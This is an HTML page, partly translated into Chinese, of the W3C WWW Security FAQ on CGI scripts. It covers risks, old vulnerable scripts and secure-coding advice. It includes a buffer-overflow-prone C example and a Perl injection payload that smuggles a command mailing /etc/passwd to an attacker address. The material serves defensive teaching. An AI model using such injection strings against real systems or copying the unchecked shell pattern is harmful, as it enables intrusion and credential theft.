@@ -1,0 +1,431 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN"
+    "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml">
+<head>
+<meta http-equiv="Content-Type" content="text/html;charset=utf-8" />
+<link rel="stylesheet" href="../style/journal.css" type="text/css" />
+<style type="text/css"><!--
+.googleadsense {
+	margin: 2px;
+	padding: 0px;
+//--></style><script src="http://www.google-analytics.com/urchin.js" type="text/javascript">
+</script>
+<script type="text/javascript">
+_uacct = "UA-65008-1";
+urchinTracker();
+</script><title>WWW Security FAQ: CGI Scripts</title>
+</head>
+<body>
+<a href="index.html">Journal</a>(2005) | <a href="../blog/"><b>Blog</b></a>(2006) | <a href="http://www.fayland.org/cgi-bin/random_link.pl">RandomLink</a> | <a href="AboutFayland.html">WhoAmI</a> | <a href="LiveBookmark.html">LiveBookmark</a> | <a href="http://www.fayland.org/">HomePage</a>
+<p><&lt;Previous: <a href="utf8.html">utf8与gb2312编码</a>&nbsp;&nbsp;>>Next: <a href="FastCGI_i.html">如何安装FastCGI</a></p>
+<h1>WWW Security FAQ: CGI Scripts</h1>
+<div class='content'>
+<p>Category: <a href='Translation.html'>Translation</a> &nbsp; Keywords: <b>WWW Security FAQ</b></p>原文URL：
+<a href='http://www.w3.org/Security/Faq/wwwsf4.html'>http://www.w3.org/Security/Faq/wwwsf4.html</a><p>
+<h2>免责申明</h2>
+
+此文档信息由 Lincoln Stein (<A
+href="mailto:lstein@cshl.org">lstein@cshl.org</a>)
+and John Stewart (<a href="mailto:jns@digitalisland.net">jns@digitalisland.net</a>) 提供。<a href='http://www.w3.org'>(W3C)</a>保留此文档仅作为对网络社区的一项服务，对此内容不负任何责任。需要更多的信息帮助，请直接联系 Lincoln Stein or John Stewart。<p>
+
+<h2>Q1: CGI脚本的问题？</h2>
+
+CGI脚本的问题在于提供了入侵漏洞的机会。编写CGI脚本时应该给予处理服务器同样的细心与注意力，因为事实上它们就是小型服务器。不幸地是对于大多数网站所有人来说，在网络编程方面他们都是初次碰到CGI脚本。
+<p>
+CGI脚本能引发安全漏洞的两种情况：
+
+<OL>
+  <LI> 有意或无意地泄漏主机系统的信息，致使方便黑客入侵。
+
+  <LI> 脚本在处理远程用户输入时，例如表单/form的内容或“可搜索索引”命令，及易受到远程用户通过故意输入可执行命令的攻击。
+</OL>
+<p>
+即使你以"nobody"身份运行服务器，CGI脚本也可能成为安全漏洞。一个蓄意破坏的CGI脚本当你以"nobody"运行时仍有足够的权限通过邮件发送系统密码文件，检查网络信息图或在一个高数字端口号上启动登陆会话（这只需要用Perl运行少许命令就可获得）。即使你的服务器运行在一个chroot目录下，一个漏洞百出的程序也能泄露足够多的系统信息来危及主机的安全。
+<H2><a NAME="CGI-Q2">Q2: 比较将CGI脚本放于文档树任何目录下然后服务器识别.cgi扩展名的运行，将它们都放在cgi-bin目录下是否更好一些？</a></H2>
+
+尽管将CGI脚本散放到文档树没有任何固有的危险，但是将它们放到cgi-bin目录下会更好一些。因为CGI脚本是如此大的潜在安全漏洞，将它们放到一起比散放到多个目录下更容易知道系统上已经安装了什么脚本。 这种优点在一个环境里有多个网站所有人时更明显。某个所有者不小心创建某个充满漏洞的脚本然后安装在文档树的某处很容易就发生。通过将CGI脚本限制在cgi-bin目录里和设置权限为只有网站管理员才能安装这些脚本，你就能避免这种混乱。
+<p>
+还有种风险是黑客设法在文档树某处创建了个.cgi文件，然后通过远程请求这个URL地址来运行它。严密控制读写权限的cgi-bin目录能减少这类事的发生。
+<H2><a NAME="CGI-Q3">Q3: 编译型语言如C是否比解释型语言如Perl和shell脚本安全？</a></H2>
+
+答案为是，但是要附带许多条件和解释。
+
+<p>
+首先是远程用户获得脚本源代码的问题。黑客对脚本是如何运行知道得越多，他就越容易找到漏洞来入侵。当一个脚本用编译型语言如C所写，你可以将它编译成二进制，放于cgi-bin，你就不用担心入侵者能获得源代码。但是对于解释型脚本，源代码总是有机会获得的。即使一个正确配置的服务器永远不会将源代码返回给可执行脚本，但是仍然有许多情况下可以跳过这限制。
+<p>
+考虑如下情况。为了方便，你决定让服务器通过辨别.cgi扩展名来判断是否CGI脚本。稍后，你需要对一个解释型CGI脚本做个细小的变动。你用Emacs文本编辑器打开然后进行修改。 不幸的是编辑器在文档树的某处留下了脚本源代码的备份复制品。虽然远程用户不能通过获取脚本本身来得到源代码，但他现在能通过猜测请求某<STRONG>URL</STRONG>来获得备份复制品：
+
+<PRE>
+        http://your-site/a/path/your_script.cgi~
+</PRE>
+（这是另一个好的理由去限制CGI脚本到cgi-bin目录和保证cgi-bin与网站文档根目录是分开的。）
+
+<p>
+当然在很多情况下用C写的CGI脚本源代码在Web上是自由发布的，黑客偷取源代码的能力不是一个问题。
+
+<p>
+另一个编译型代码优于解释型代码的原因是大小和复杂性问题。大的软件程序，例如shell和Perl解释器，很有可能存在漏洞。某些漏洞可能是安全漏洞。它们在那，只是我们不知道它们是什么。
+
+<p>
+第三个需要考虑的是脚本语言非常容易发送数据到系统命令并且捕获输出。如下所示，在脚本里调用系统命令是一个主要的潜在安全漏洞。在C里调用系统命令比较费劲，所以程序员更少去做这些。特别需要说明的是，不管复杂程序如何，写一个能避免危险结构的shell脚本是非常非常困难的。Shell脚本除了写些小CGI程序，最好不要用它。
+
+<p>
+我上面所说的，请不要理解成我担保编译型很安全。C程序也有许多可入侵漏洞，如 NCSA httpd 1.3 和 sendmail 的经历所示。平衡解释型脚本问题可以试着将它们编写的小一点，如此可以让作者外的其他人更容易懂些。此外，Perl包括某些内置特性能捕获潜在的安全漏洞。例如检查感染/taint（参考下面）能捕获大多数CGI脚本里的普通缺陷，这能使Perl脚本在某种程度上与等同的C程序更安全。
+<H2><a NAME="CGI-Q4">Q4: 我在Web上发现一个好CGI脚本，我想安装它。那我该如何知道它是否是安全的？</a></H2>
+
+<p>
+你永远不能确保一个脚本是安全的。你所能做的最好的方法是仔细检查并且明白它在做什么和它是怎么做的。如果你不懂这脚本所写的语言，那么给懂它的其他人看看。
+<p>
+当你检查脚本时所需要考虑的：
+
+<OL>
+  <LI> 它有多复杂？它越长就越容易出现问题。
+
+  <LI> 它是否在主机系统上读写文件？读文件的程序可能违反你所设置的权限约束，或泄露系统信息给黑客。写文件的程序可能会修改和破坏文档，或更糟糕的，给系统引入某木马。
+
+  <LI> 它是否与系统的其他程序交互？例如，许多CGI脚本回复表单输入时是通过建立sendmail程序的通道来发送e-mail的。它完成此事的方式是否安全？
+
+  <LI> 它是否在 suid (set-user-id) 权限下运行？通常来说这是件非常危险的事，脚本要有非常足够的理由来做此事。
+
+  <LI> 作者是否检查了用户的所有表单输入？检查表单输入是作者有考虑安全问题的一个信号。
+
+  <LI> 作者是否使用直接的路径名来调用外部程序？依赖PATH环境变量来解决部分路径名是件危险的事。
+</OL>
+
+<H2><a NAME="CGI-Q5">Q5: 哪些CGI脚本己知存在系统漏洞？</a></H2>
+
+很大一部分广为发布的CGI脚本都存在已知漏洞。这里所列的大部分漏洞已经被捕获和修正，但如果你运行的是这些脚本的旧版本，那你仍然是易受攻击的。删除它然后获得最新的版本。如果该脚本没有任何修正，那就不要使用它。
+
+<DL>
+  <dt>HotMail
+  <dd>该CGI脚本运行了流行的Hotmail e-mail系统，一个缺陷安全系统能使未被授权的个人进入他人的e-mail帐号和阅读他们的邮件。该问题已知影响了1998年十二月的Hotmail版本。需要更多的信息，请参考如下链接：      <ul>
+	<li><a
+	    href="http://email.miningco.com/library/nus/bl120898-1.htm">http://email.miningco.com/library/nus/bl120898-1.htm</a>
+	<li><a href="http://www.geocities.com/ResearchTriangle/Lab/6601/shailesh/hotmail.html">http://www.geocities.com/ResearchTriangle/Lab/6601/shailesh/hotmail.html</a>
+      </ul>
+  <p>
+  <dt>Matt Wright's 文本计数器/TextCounter 版本 1.0-1.2 (Perl) 和 1.0-1.3 (C++) (June 1998)
+  <dd>该文本计数器的早期版本，用于在页面上显示该页被点击数，未能在用户提供的输入中移除shell字符。该漏洞的结果能使远程用户在服务器主机上运行shell命令。影响包括Perl和C++版本。请升级到版本 1.21 (Perl) 或 version 1.31 (C++):
+      <ul>
+	<li>(Perl) <a
+	    href="http://www.worldwidemart.com/scripts/textcounter.shtml">http://www.worldwidemart.com/scripts/textcounter.shtml</a>
+	<li>(C++) <a href="http://www.worldwidemart.com/scripts/C++/textcounter.shtml">http://www.worldwidemart.com/scripts/C++/textcounter.shtml</a>
+      </ul>
+  <p>
+
+  <dt>各种留言本脚本(June 1998)
+  <dd>那时候有持续的漏洞报道，涉及了各种各样的留言本脚本。首先被确认的是 Selena Sol 留言本，但是也影响了其他脚本。这些漏洞利用了脚本没有从用户输入中过滤掉HTML标签，所以可以在目录下将ssi(server-side includes)写入留言本文件。留言本脚本应当过滤掉HTML标签或者将<>替换为字符实体 & gt; and & lt;（当中无空格）。这些被写入的文件<strong>不</strong>应该置于允许运行ssi,asp,php或其他HTML模版的目录中。关于此问题的详细描述请参考 Selena Sol/Extropia 存档 <a
+      href="http://www.extropia.com/">http://www.extropia.com/</a>
+  <p>
+
+  <dt>Excite Web Search Engine (EWS) version (November 1998)
+  <dd>The Excite Web Search engine stores critical security
+      information (including the encrypted administrative password) in
+      world writable files.  This allows unprivileged local users to
+      gain access to the EWS administrative front end on both Unix and
+      NT systems.
+
+      <p>
+
+      Note that this bug only endangers your
+      Web site if you have the search engine installed locally.  It
+      does not affect sites that link to Excite.com's search pages, or
+      sites that are indexed by the Excite robot.
+
+      <p>
+
+      A worse problem is found in unpatched versions of EWS earlier than
+      Feburary 1998 (unfortunately, also called version 1.1).  This
+      bug involves the failure to check user-supplied
+      parameters before passing them to the shell, allowing remote
+      users to execute shell commands on the server host.  The
+      commands will be executed with the privileges of the Web
+      server.
+
+      <p>
+
+      See
+      <a
+      href="http://www.excite.com/navigate/patches.html">
+      http://www.excite.com/navigate/patches.html</a>
+      for more information and patches.
+      
+      <p>
+  <dt>info2www, versions 1.0-1.1
+  <dd>info2www, which converts GNU "info" files into Web pages,
+      fails to check user-provided filenames before opening them.  As
+      a result, it can be tricked into opening system files or
+      executing commands containing shell metacharacters.  Versions
+      1.2 and higher are reported to be free of the problem, but due
+      to the many extant versions of this script, you should probably
+      examine the source code yourself before installing it.  Also
+      scrutinize the CGI scripts info2html and infogate, which are
+      apparently based on info2www.
+      <p>
+  <dt>Count.cgi, versions 1.0-2.3
+  <dd>Count.cgi, widely used to produce page hit counts, contains a
+      stack overflow bug that allows malicious remote users to execute
+      Unix commands on the server by sending the script carefully
+      crafted query strings.  Version 2.4 corrects this bug.  It can
+      be found at <a href=" http://www.fccc.edu/users/muquit/Count.html"> http://www.fccc.edu/users/muquit/Count.html</a>.
+      <p>
+  <dt>webdist.cgi, part of IRIX Mindshare <cite>Out Box</cite> versions 1.0-1.2
+  <dd>This script is part of a system that allows users to install
+      and distribute software across the network.  Due to inadequate
+      checking of CGI parameters, remote users can execute commands on
+      the server system with the permissions of the server daemon.
+  <dd><strong>This bug has not been fixed as of June 12, 1997</strong>.
+      Contact Mindshare for patches/workarounds.  Until your
+      copy of webdist.cgi is fixed, disable it by removing its execute
+      permissions.
+      <p>
+  <dt>php.cgi, multiple versions
+  <dd>The php.cgi script, which provides an HTML-embedded programming
+      language embedded
+      in HTML pages, database access, and other nice features, should
+      <strong>never</strong> be installed in the scripts (cgi-bin) directory.  This 
+      allows anyone on the Internet to run shell commands on the
+      Web server host machine.  In addition, versions through 2.0b11 contain
+      known security holes.  Be sure to update to the most recent
+      version and check the PHP site (see URL below) for other
+      security-related news.  The <strong>Apache module</strong> version of 
+      PHP, since it does not run as a CGI script, is said not contain
+      these holes.  Nevertheless, you are encouraged to keep your
+      system current.
+  <dd><a href="http://php.iquest.net/">http://php.iquest.net/</a>
+      <p>
+  <dt><cite>files.pl</cite>, part of Novell WebServer Examples Toolkit
+      v.2
+  <dd>Due to a failure to check user input, the <cite>files.pl</cite>
+      example CGI script that comes with the Novell WebServer
+      installation allows users to view any file or directory on your
+      system, compromising confidentail documents, and potentially
+      giving crackers the information they need to
+      break into your system.  Remove this script, and any other CGI
+      scripts (examples or otherwise) that you do not need.
+      <p>
+  <dt>Microsoft FrontPage Extensions, versions 1.0-1.1
+  <dd>Under certain circumstances, unauthorized users can vandalize
+      authorized users' files by appending to them or overwriting
+      them.  On a system with server-side includes enabled, remote
+      users may be able to exploit this bug to execute commands on the
+      server.
+  <dd><a href="http://www.microsoft.com/security/bulletins/">http://www.microsoft.com/security/bulletins/</a>
+      <p>
+  <dt>nph-test-cgi, all versions
+  <dd>This script, included in many versions of the NCSA httpd and
+      apache daemons, can be exploited by remote users to obtain a file
+      listing of any directory on the Web server.  It should be
+      removed or disabled (by removing execute permissions).
+      <p>
+  <dt>nph-publish, versions 1.0-1.1
+  <dd>Under certain circumstances, remote users can clobber
+      world-writable files on the server.
+  <dd> <a
+      href="http://stein.cshl.org/~lstein/server_publish/">http://www.genome.wi.mit.edu/~lstein/server_publish/nph-publish.txt</a>
+      <p>
+  <DT> AnyForm, version 1.0
+  <dd>Remote users can execute commands on the server.
+  <DD> <a
+      href="http://www.uky.edu/~johnr/AnyForm2">http://www.uky.edu/~johnr/AnyForm2</a>
+      <p>
+  <DT> FormMail, version 1.0
+  <dd>Remote users can execute commands on the server.
+  <DD> <a
+      href="http://alpha.pr1.k12.co.us/~mattw/scripts.html">http://alpha.pr1.k12.co.us/~mattw/scripts.html</a>
+      <p>
+  <DT> "phf" phone book script, distributed with NCSA httpd and
+      Apache, all versions
+  <dd>Remote users can execute commands on the server.
+  <DD> <a href="http://hoohoo.ncsa.uiuc.edu/">http://hoohoo.ncsa.uiuc.edu/</a>
+</DL>
+
+<p>
+
+To my eternal chagrin, one of the buggy CGI scripts to be discovered
+is in <cite>nph-publish</cite>, a script that I wrote myself to allow
+HTML documents to be "published" to the Apache web server from a
+publish-savvy editor such as Netscape Navigator Gold.  I didn't check
+user-provided pathnames correctly, potentially allowing the script to
+write files into places where they aren't allowed.  If the server is
+run with too many privileges, this can cause big problems.  <strong>If
+you use this script, please upgrade to version 1.2 or higher.</strong>
+The bug was discovered by Randal Schwartz (<a
+href="mailto:merlyn@stonehenge.com">merlyn@stonehenge.com</a>).
+
+<p>
+
+The holes in the second two scripts on the list were discovered by
+Paul Phillips (<A HREF="mailto:paulp@cerf.net">paulp@cerf.net</A>),
+who also wrote the <A
+HREF="http://www.go2net.com/people/paulp/cgi-security/safe-cgi.txt">CGI
+security FAQ</A>.  The hole in the PHF (phone book) script was
+discovered by Jennifer Myers <a
+href="mailto:jmyers@marigold.eecs.nwu.edu">
+(jmyers@marigold.eecs.nwu.edu)</a>, and is representative of a
+potential security hole in all CGI scripts that use NCSA's
+<code>util.c</code> library.  <a href="wwwsf3.html#util.c">Here's a
+patch</a> to fix the problem in <code>util.c</code>.
+
+<p>
+
+Reports of other buggy scripts will be posted here on an intermittent
+basis.
+
+<p>
+
+In addition, one of the scripts given as an example of "good CGI
+scripting" in the published book "Build a Web Site" by net.Genesis and
+Devra Hall contains the classic error of passing an unchecked user
+variable to the shell.  The script in question is in Section 11.4,
+"Basic Search Script Using Grep", page 443.  Other scripts in this
+book may contain similar security holes.
+
+<p>
+
+This list is far from complete.  No centralized authority is
+monitoring all the CGI scripts that are released to the public; the
+CERT does issue alerts about buggy CGI scripts when it learns about
+them, and it's a good idea to subscribe to their mailing list, or to
+browse the alert archive from time to time (see <a
+href="wwwsf7.html#bibliography">the bibliography</a>).
+<H2><a NAME="CGI-Q6">Q6: I'm developing custom CGI scripts.  What unsafe practices
+     should I avoid?</a></H2>
+
+<OL>
+  <LI> Avoid giving out too much information about your site and server
+       host.
+<p>
+       Although they can be used to create neat effects, scripts that leak
+       system information are to be avoided.  For example, the "finger"
+       command often prints out the physical path to the fingered user's home
+       directory and scripts that invoke finger leak this information (you
+       really should disable the finger daemon entirely, preferably by
+       removing it).  The <TT>w</TT> command gives information about what programs
+       local users are using.  The <TT>ps</TT> command, in all its shapes and forms,
+       gives would-be intruders valuable information on what daemons are
+       running on your system.
+
+<p>
+  <LI> If you're coding in a compiled language like C, avoid making
+       assumptions about the size of user input.
+
+<p>
+       A MAJOR source of security holes has been coding practices that
+       allowed character buffers to overflow when reading in user input.
+       Here's a simple example of the problem:
+
+<pre><code>
+   #include &lt;stdlib.h>
+   #include &lt;stdio.h>
+   static char query_string[1024];
+
+   char* read_POST() {
+      int query_size;
+      query_size=atoi(getenv("CONTENT_LENGTH"));
+      fread(query_string,query_size,1,stdin);
+      return query_string;
+   }
+</code></PRE>
+
+       The problem here is that the author has made the assumption that user
+       input provided by a POST request will never exceed the size of the
+       static input buffer, 1024 bytes in this example.  This is not good.  A
+       wily hacker can break this type of program by providing input many
+       times that size.  The buffer overflows and crashes the program; in
+       some circumstances the crash can be exploited by the hacker to execute
+       commands remotely.
+
+<p>
+       Here's a simple version of the read_POST() function that avoids
+       this problem by allocating the buffer dynamically.  If there isn't
+       enough memory to hold the input, it returns NULL:
+
+<pre>
+   char* read_POST() {
+      int query_size=atoi(getenv("CONTENT_LENGTH"));
+      char* query_string = (char*) malloc(query_size);
+      if (query_string != NULL)
+         fread(query_string,query_size,1,stdin);
+      return query_string;
+   }
+</PRE>
+
+Of course, once you've read in the data, you should continue to make
+sure your buffers don't overflow.  Watch out for strcpy(), strcat()
+and other string functions that blindly copy strings until they reach
+the end.  Use the strncpy() and strncat() calls instead.
+
+<pre>
+   #define MAXSTRINGLENGTH 255
+   char myString[MAXSTRINGLENGTH + sizeof('\0')];
+   char* query = read_POST();
+   assert(query != NULL);
+   strncpy(myString,query,MAXSTRINGLENGTH);
+   myString[MAXSTRINGLENGTH]='\0';      /* ensure string terminator */
+</pre>
+
+(Note that the semantics of strncpy are nasty when the input string is
+exactly MAXSTRINGLENGTH bytes long, leading to some necessary fiddling with
+the terminating NULL.)
+
+  <LI> <a name="bad_shell">Never</a>, <EM>never</EM>,
+      <STRONG>never</STRONG>
+      pass unchecked remote user input to a shell command.
+
+<p>
+       In C this includes the popen(), and system() commands, all of which
+       invoke a /bin/sh subshell to process the command.  In Perl this
+       includes system(), exec(), and piped open() functions as well as the
+       eval() function for invoking the Perl interpreter itself.  In the
+       various shells, this includes the exec and eval commands.
+
+<p>
+       Backtick quotes, available in shell interpreters and Perl for
+       capturing the output of programs as text strings, are also dangerous.
+
+<p>
+       The reason for this bit of paranoia is illustrated by the following
+       bit of innocent-looking Perl code that tries to send mail to an
+       address indicated in a fill-out form.
+
+<pre>
+   $mail_to = &get_name_from_input; # read the address from form
+   open (MAIL,"| /usr/lib/sendmail $mail_to");
+   print MAIL "To: $mailto\nFrom: me\n\nHi there!\n";
+   close MAIL;
+</pre>
+
+The problem is in the piped open() call.  The author has assumed that
+the contents of the $mail_to variable will always be an innocent
+e-mail address.  But what if the wiley hacker passes an e-mail address
+that looks like this?
+
+<pre><code>
+     nobody@nowhere.com;mail badguys@hell.org&lt;/etc/passwd;
+</code></pre>
+
+Now the open() statement will evaluate the following command:
+
+<pre><code>
+/usr/lib/sendmail nobody@nowhere.com; mail badguys@hell.org&lt;/etc/passwd
+</code></pre>
+
+Unintentionally, open() has mailed the contents of the system password
+file to the remote user, opening the host to password cracking attack.
+</OL>
+<p>
+
+Ultimately it's up to you to examine each script and make sure that
+it's not doing anything unsafe.
+<HR>
+
+<tt>$Id: wwwsf4.html,v 1.11 2003/02/23 22:46:27 lstein Exp $</tt></div>
+<p><&lt;Previous: <a href="utf8.html">utf8与gb2312编码</a>&nbsp;&nbsp;>>Next: <a href="FastCGI_i.html">如何安装FastCGI</a></p>
+<p><strong>Options:</strong> <a href='http://del.icio.us/post?title=WWW%20Security%20FAQ:%20CGI%20Scripts&url=http://www.fayland.org/journal/wwwsf4.cn.html'>+Del.icio.us</a></p>
+<strong>Related items</strong>
+<ul><li><a href='GoogleGroup.html'>WWW::Mechanize && Google Group</a> < <span class='digit'>2005-04-13 18:49:43</span> ></li></ul>
+Created on <span class="digit">2004-11-10 22:30:44</span>, Last modified on <span class="digit">2004-11-19 12:26:55</span><br />
+Copyright 2004-2005 All Rights Reserved. Powered by <a href="Eplanet.html">Eplanet</a> && <a href='http://catalyst.perl.org'>Catalyst</a> 5.62.
+</body>
+</html>
